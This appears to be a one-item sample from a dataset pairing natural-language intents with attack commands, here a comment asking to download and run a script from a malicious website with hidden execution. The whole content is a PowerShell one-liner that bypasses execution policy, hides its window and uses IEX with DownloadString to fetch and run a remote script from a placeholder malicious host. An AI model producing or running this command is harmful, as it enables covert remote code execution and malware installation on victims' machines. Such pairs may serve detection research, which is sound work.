# Natural language intent:
# Download and execute a script from a malicious website with hidden execution.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/Kwernel.ps1')"
